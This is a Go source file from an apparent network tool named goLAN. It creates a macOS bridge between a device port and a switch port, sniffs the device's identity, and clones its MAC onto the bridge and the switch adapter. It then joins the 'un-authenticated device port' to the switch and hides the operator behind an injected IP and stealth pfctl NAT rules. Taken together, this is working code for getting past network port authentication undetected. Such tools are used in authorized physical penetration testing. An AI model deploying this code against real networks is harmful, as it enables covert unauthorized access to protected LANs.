package bridge

import (
	"fmt"
	"os/exec"
	"strings"
	"sync"
	"net"
	"context"

	"github.com/mcrn/goLAN/internal/stealth"
)

// BridgeState represents the current state of the bridge.
type BridgeState int

const (
	BridgeStateDown    BridgeState = iota
	BridgeStateCreated             // bridge created but not fully up
	BridgeStateUp                  // bridge active and forwarding
	BridgeStateSniffing            // bridge up, waiting for target identity
	BridgeStateStealthActive       // stealth NAT and spoofing applied
)

func (s BridgeState) String() string {
	switch s {
	case BridgeStateDown:
		return "Down"
	case BridgeStateCreated:
		return "Created"
	case BridgeStateUp:
		return "Active"
	case BridgeStateSniffing:
		return "Sniffing..."
	case BridgeStateStealthActive:
		return "Stealth Active"
	default:
		return "Unknown"
	}
}

// Bridge represents a macOS kernel bridge between two network interfaces.
type Bridge struct {
	mu            sync.Mutex
	name          string // e.g. "bridge0"
	ifaceA        string // first member interface (Device)
	ifaceB        string // second member interface (Switch)
	state         BridgeState
	origForwarding string // original ip.forwarding value before we changed it
	isStealth     bool
	targetID      *stealth.TargetIdentity
	cancelStealth context.CancelFunc
	reconLogs     []string
}

// BridgeStatus is a snapshot of the bridge state for the TUI.
type BridgeStatus struct {
	Name     string
	IfaceA   string
	IfaceB   string
	State    BridgeState
	RawInfo  string // raw output from ifconfig
	TargetID *stealth.TargetIdentity
	ReconLogs []string
}

// NewBridge creates a macOS kernel bridge between two interfaces.
// This requires root privileges.
func NewBridge(ifaceA, ifaceB string, ignoreMAC string) (*Bridge, error) {
	b := &Bridge{
		ifaceA: ifaceA,
		ifaceB: ifaceB,
		state:  BridgeStateDown,
	}

	// Save original IP forwarding state.
	origFwd, err := sysctl("net.inet.ip.forwarding")
	if err == nil {
		b.origForwarding = origFwd
	}

	// Step 1: Create the bridge interface.
	out, err := runCmd("ifconfig", "bridge", "create")
	if err != nil {
		return nil, fmt.Errorf("creating bridge: %w (output: %s)", err, out)
	}
	b.name = strings.TrimSpace(out)
	b.state = BridgeStateCreated

	// Step 2: Bring ONLY the Device port up so we can silently sniff it.
	// We deliberately leave the Switch port electrically dead (DOWN) to prevent macOS
	// from leaking factory MAC discovery packets to the active switch!
	_, _ = runCmd("ifconfig", ifaceA, "up")

	// We DELAY bridging them until the MAC is explicitly spoofed!
	b.state = BridgeStateCreated

	// Kick off stealth NAT setup if requested.
	// Hardcoded to true for now as per user request to use strat 1.
	b.isStealth = true 
	
	if b.isStealth {
		ctx, cancel := context.WithCancel(context.Background())
		b.cancelStealth = cancel
		b.state = BridgeStateSniffing
		go b.runStealth(ctx, ignoreMAC)
	}

	return b, nil
}

// runStealth asynchronously sniffs the line and configures NAT.
func (b *Bridge) runStealth(ctx context.Context, ignoreMAC string) {
	// ifaceA is the Device Port. We sniff here because packets from the
	// device enter this port before traversing the bridge.
	sniff := stealth.NewSniffer(b.ifaceA)
	
	logFunc := func(msg string) {
		b.mu.Lock()
		b.reconLogs = append(b.reconLogs, msg)
		b.mu.Unlock()
	}

	onMacFunc := func(mac net.HardwareAddr) {
		b.mu.Lock()
		b.state = BridgeStateUp
		b.mu.Unlock()
		
		logFunc(fmt.Sprintf("[*] Activating bridge using spoofed Target MAC %s", mac.String()))
		runCmd("ifconfig", b.name, "ether", mac.String())
		
		logFunc(fmt.Sprintf("[*] Hard-spoofing Switch adapter factory MAC to %s", mac.String()))
		out, err := runCmd("ifconfig", b.ifaceB, "ether", mac.String())
		
		var safeToConnect string
		if err != nil {
			if strings.Contains(string(out), "Network is down") {
				logFunc("[!] Hardware spoof locked. Safe UP strobe initiated...")
				runCmd("ifconfig", b.ifaceB, "up")
				out, err = runCmd("ifconfig", b.ifaceB, "ether", mac.String())
				if err != nil {
					logFunc("[+] Bypass active: Hardware locked.")
					logFunc("[*] Relying on Bridge Layer 2 masking.")
					safeToConnect = "[!] Spoof hardware-locked. Connect Switch at your own risk."
				} else {
					logFunc("[+] Strobe successful: MAC spoof injected.")
					safeToConnect = "[+] Spoof complete. You may plug the Switch into the adapter."
				}
			} else {
				logFunc("[+] Bypass active: Hardware locked.")
				logFunc("[*] Relying on Bridge Layer 2 masking.")
				safeToConnect = "[!] Spoof hardware-locked. Connect Switch at your own risk."
			}
		} else {
			safeToConnect = "[+] Spoof complete. You may plug the Switch into the adapter."
		}

		logFunc("[*] Bridging un-authenticated device port safely to switch...")
		runCmd("ifconfig", b.name, "addm", b.ifaceA, "addm", b.ifaceB)
		
		logFunc("[*] Powering UP Switch adapter...")
		runCmd("ifconfig", b.ifaceB, "up")
		
		logFunc(safeToConnect)
		
		runCmd("ifconfig", b.name, "up")
		runCmd("sysctl", "-w", "net.inet.ip.forwarding=1")
		logFunc("[*] Bridge physical tunnel UP.")
	}

	id, err := sniff.Discover(ctx, ignoreMAC, logFunc, onMacFunc)
	if err != nil {
		logFunc(fmt.Sprintf("[!] Reconnaissance aborted: %v", err))
		return
	}

	b.mu.Lock()
	b.targetID = id
	b.mu.Unlock()

	hiddenIP := "192.168.254.10"
	logFunc(fmt.Sprintf("[*] Injecting hidden routable IP %s...", hiddenIP))
	runCmd("ifconfig", b.name, hiddenIP, "netmask", "255.255.255.0", "up")

	logFunc("[*] Activating Stealth NAT proxy on bridge...")
	rule := stealth.PFRule{
		Interface: b.name,
		HiddenIP:  hiddenIP,
		TargetIP:  id.IP.String(),
	}
	err = stealth.EnableNAT(rule)
	if err != nil {
		logFunc(fmt.Sprintf("[!] ERROR injecting NAT: %v", err))
	} else {
		logFunc("[+] pfctl rules active. Stealth mode successfully engaged.")
	}

	b.mu.Lock()
	b.state = BridgeStateStealthActive
	b.mu.Unlock()
}

// Name returns the kernel name of the bridge (e.g. "bridge0").
func (b *Bridge) Name() string {
	b.mu.Lock()
	defer b.mu.Unlock()
	return b.name
}

// State returns the current bridge state.
func (b *Bridge) State() BridgeState {
	b.mu.Lock()
	defer b.mu.Unlock()
	return b.state
}

// IfaceA returns the name of the first member interface.
func (b *Bridge) IfaceA() string {
	return b.ifaceA
}

// IfaceB returns the name of the second member interface.
func (b *Bridge) IfaceB() string {
	return b.ifaceB
}

// Status returns a snapshot of the bridge state.
func (b *Bridge) Status() BridgeStatus {
	b.mu.Lock()
	defer b.mu.Unlock()

	status := BridgeStatus{
		Name:     b.name,
		IfaceA:   b.ifaceA,
		IfaceB:    b.ifaceB,
		State:     b.state,
		TargetID:  b.targetID,
		ReconLogs: append([]string(nil), b.reconLogs...), // copy so UI slice is safe
	}

	if b.name != "" {
		out, err := runCmd("ifconfig", b.name)
		if err == nil {
			status.RawInfo = out
		}
	}

	return status
}

// Destroy tears down the bridge, removes members, and restores IP forwarding.
func (b *Bridge) Destroy() error {
	b.mu.Lock()
	defer b.mu.Unlock()
	return b.destroy()
}

// destroy is the internal teardown (must hold mu).
func (b *Bridge) destroy() error {
	if b.name == "" {
		return nil
	}

	if b.cancelStealth != nil {
		b.cancelStealth()
	}
	if b.isStealth {
		stealth.DisableNAT()
	}

	var errs []string

	// On macOS, destroying the bridge interface automatically unbinds all members.
	// This reduces 4 synchronous commands down to 1, eliminating TUI freezing.
	if _, err := runCmd("ifconfig", b.name, "destroy"); err != nil {
		errs = append(errs, fmt.Sprintf("destroying %s: %v", b.name, err))
	}

	// Restore original IP forwarding setting.
	if b.origForwarding != "" {
		val := strings.TrimSpace(b.origForwarding)
		_, _ = runCmd("sysctl", "-w", "net.inet.ip.forwarding="+val)
	}

	b.state = BridgeStateDown

	if len(errs) > 0 {
		return fmt.Errorf("teardown errors: %s", strings.Join(errs, "; "))
	}
	return nil
}

// CleanupStaleBridges finds and destroys any existing bridge interfaces.
// Useful for recovering from a crashed session.
func CleanupStaleBridges() ([]string, error) {
	out, err := runCmd("ifconfig", "-l")
	if err != nil {
		return nil, fmt.Errorf("listing interfaces: %w", err)
	}

	var cleaned []string
	for _, name := range strings.Fields(out) {
		if strings.HasPrefix(name, "bridge") {
			if _, err := runCmd("ifconfig", name, "destroy"); err == nil {
				cleaned = append(cleaned, name)
			}
		}
	}

	return cleaned, nil
}

// runCmd executes a command and returns its combined output.
func runCmd(name string, args ...string) (string, error) {
	cmd := exec.Command(name, args...)
	out, err := cmd.CombinedOutput()
	return string(out), err
}

// sysctl reads a sysctl value and returns just the value part.
// e.g. "net.inet.ip.forwarding: 0" → "0"
func sysctl(key string) (string, error) {
	out, err := runCmd("sysctl", key)
	if err != nil {
		return "", err
	}
	parts := strings.SplitN(strings.TrimSpace(out), ":", 2)
	if len(parts) == 2 {
		return strings.TrimSpace(parts[1]), nil
	}
	return strings.TrimSpace(out), nil
}
